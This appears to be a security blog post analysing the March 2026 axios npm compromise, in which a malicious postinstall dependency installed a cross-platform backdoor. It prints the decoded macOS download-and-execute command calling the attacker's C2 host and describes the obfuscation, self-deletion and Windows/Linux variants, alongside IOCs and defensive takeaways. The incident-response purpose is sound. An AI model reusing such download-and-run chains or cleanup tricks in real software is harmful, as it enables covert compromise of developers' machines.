---
layout: post
title:  "Welcome to Transitive Dependency Hell"
tags: security supply-chain npm
---

At 00:21 UTC on March 31, someone published `axios@1.14.1` to npm. Three hours later it was pulled. In between, every `npm install` and `npx` invocation that resolved `axios@latest` executed a backdoor on the installing machine. Axios has roughly 80 million weekly downloads, and here's what that three-hour window looked like from one developer's MacBook.

## Monday Night

A developer sits down, opens a terminal, and runs a command they've run dozens of times before:

```
npx --yes @datadog/datadog-ci --help
```

A legitimate tool from a legitimate vendor. The `--yes` flag skips npm's confirmation prompt. The developer (or Claude) isn't even using the tool yet, just checking its options.

npm resolves the dependency tree and starts writing packages to disk: `dogapi`, `escodegen`, `esprima`, `js-yaml`, `fast-xml-parser`, `rc`, `is-docker`, `semver`, `uuid`, and `axios`. All names you'd recognize, and all packages that individually look fine. But `axios` just resolved to `1.14.1`, which is not the version that Axios's maintainers published four days earlier. It's the version an attacker published twenty minutes ago.

## The Hijack

`axios@1.14.0` was the last legitimate release, published on March 27 through GitHub Actions OIDC provenance. The attacker compromised the npm account of `jasonsaayman`, an existing Axios maintainer, and changed the account email from `jasonsaayman@gmail.com` to `ifstap@proton.me`. With publish access, they pushed two malicious versions in quick succession:

- **00:21:58 UTC**: `axios@1.14.1`, tagged `latest`
- **01:00:57 UTC**: `axios@0.30.4`, tagged `legacy`

The `latest` tag meant every unversioned `axios` install worldwide pulled the backdoor. The `legacy` tag caught anyone pinned to the 0.x line. Both versions added a single new dependency: `plain-crypto-js`.

## The Postinstall Chain

`plain-crypto-js` declared `postinstall: node setup.js` in its `package.json`, and npm ran it automatically. The script used two layers of obfuscation (string reversal with base64 decoding, then an XOR cipher keyed with `OrDeR_7077`) to hide its real behavior from anyone grepping for suspicious strings. Once decoded, it branched by platform.

On the developer's Mac, CrowdStrike's process tree captured the full chain. `npx` spawned `node setup.js`, which shelled out to `/bin/sh` to launch `osascript` against a script dropped into the per-user temp directory:

```
nohup osascript /var/folders/gz/s87fs56d0pqbr1s7l1b898h80000gn/T/6202033
```

`osascript` is Apple's AppleScript interpreter, a legitimate Apple-signed binary present on every Mac. Running code through it instead of directly lets the attacker hide behind a trusted process name. The `nohup` ensures the process survives if the parent terminal closes, and the AppleScript then executed the real payload:

```bash
sh -c 'curl -o /Library/Caches/com.apple.act.mond \
            -d packages.npm.org/product0 \
            -s http://sfrclak.com:8000/6202033 \
       && chmod 770 /Library/Caches/com.apple.act.mond \
       && /bin/zsh -c "/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &"' \
  &> /dev/null
```

Download, set executable, and launch the beacon, all in a single `sh -c` invocation. If any step fails, the chain stops. If it succeeds, the malware is already running before the AppleScript exits.

The output path masquerades as an Apple system daemon using the `com.apple.*` reverse-DNS convention. The `-d packages.npm.org/product0` is not a real npm URL but a tracking identifier sent as POST data so the C2 knows which package triggered the install. The `-s` flag keeps curl silent, and the outer `&> /dev/null` swallows any output from the entire chain.

The binary immediately began beaconing to `142.11.206.73:8000` (`sfrclak.com`) over HTTP. Ten hours later, CrowdStrike's telemetry shows `com.apple.act.mond` still running and reading `/Library/Preferences/com.apple.networkd.plist` for network interface configurations, proxy settings, and VPN connection details. The kind of reconnaissance you do when you're deciding whether a machine is worth keeping access to.

Meanwhile, back in `node_modules`, `setup.js` was cleaning up after itself. It deleted its own file with `fs.unlink(__filename)` and renamed a clean `package.md` to `package.json`, overwriting the version that declared the postinstall hook. Anyone investigating the installed package later would find no trace of the trigger.

## Not Just Macs

The same `setup.js` had branches for every major platform:

| Platform | Payload Path | Technique |
|---|---|---|
| macOS | `/Library/Caches/com.apple.act.mond` | AppleScript, curl, binary masquerading as Apple daemon |
| Windows | `%PROGRAMDATA%\wt.exe` | PowerShell copied and renamed to look like Windows Terminal; VBScript loader drops `.ps1` payload with `-w hidden -ep bypass` |
| Linux | `/tmp/ld.py` | Python script downloaded and backgrounded with `nohup python3` |

All three phoned home to the same C2: `sfrclak.com:8000/6202033`.

## What CrowdStrike Caught (and Didn't)

Falcon flagged the macOS beacon as `MacOSApplicationLayerProtocol`, mapping to [T1071](https://attack.mitre.org/techniques/T1071/) (Application Layer Protocol) under [TA0011](https://attack.mitre.org/tactics/TA0011/) (Command and Control). The detection triggered on the last step in the chain: a binary at a suspicious path making outbound HTTP requests on a non-standard port.

Everything before that ran unimpeded. The `node setup.js` postinstall hook, the `osascript` execution from a temp directory, the `curl` download and `chmod` all completed before any security tooling intervened. If the attacker had used HTTPS on port 443 to a less suspicious-looking domain, the beacon might not have triggered either.

## IOCs

| Indicator | Type | Value |
|---|---|---|
| C2 Domain | Domain | `sfrclak.com` |
| C2 IP | IPv4 | `142.11.206.73` |
| C2 Port | Port | `8000` |
| Campaign ID | String | `6202033` |
| macOS Payload | File | `/Library/Caches/com.apple.act.mond` |
| macOS Hash | SHA256 | `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a` |
| Windows Payload | File | `%PROGRAMDATA%\wt.exe` |
| Linux Payload | File | `/tmp/ld.py` |
| Tracking ID | String | `packages.npm.org/product0` |
| Compromised Packages | npm | `axios@1.14.1`, `axios@0.30.4`, `plain-crypto-js@4.2.0-4.2.1` |
| Hijacked Account | npm | `jasonsaayman` (email changed to `ifstap@proton.me`) |
| XOR Key | String | `OrDeR_7077` |

## Takeaways

**Check your lockfiles now.** Search `package-lock.json`, `yarn.lock`, and `pnpm-lock.yaml` for `axios@1.14.1`, `axios@0.30.4`, or any reference to `plain-crypto-js`. If you find them, assume the installing machine is compromised.

**Disable postinstall scripts.** Add `ignore-scripts=true` to `~/.npmrc`. When a package legitimately needs a postinstall hook for native compilation, run `npm rebuild <package>` explicitly after reviewing the script. This single setting would have stopped the entire attack chain.

**Monitor for `osascript` spawned by `node`.** There is no legitimate reason for a Node.js process to execute AppleScript from a temp directory. If your endpoint detection sees that process ancestry, kill it.

The developer did nothing wrong. They ran a standard tool from a major vendor and trusted npm to deliver safe code. The problem is that npm's default behavior (resolve the full tree, install everything, run every postinstall script, no questions asked) turns every `npm install` into an implicit trust decision across hundreds of packages maintained by people you've never met. The Axios maintainer account was compromised for three hours. That was enough.

---

*This is the third post in a series on software supply chain attacks. The previous posts covered the [Trivy ecosystem compromise]({{ site.baseurl }}/2026/03/20/typosquatting-trivy) and [the limits of SHA pinning]({{ site.baseurl }}/2026/03/24/sha-pinning-is-not-enough). Joe Desimone's [technical analysis](https://gist.github.com/joe-desimone/36061dabd2bc2513705e0d083a9673e7) of the axios compromise is worth reading in full.*

If you liked (or hated) this blog, feel free to check out my [GitHub](https://github.com/RoseSecurity)!
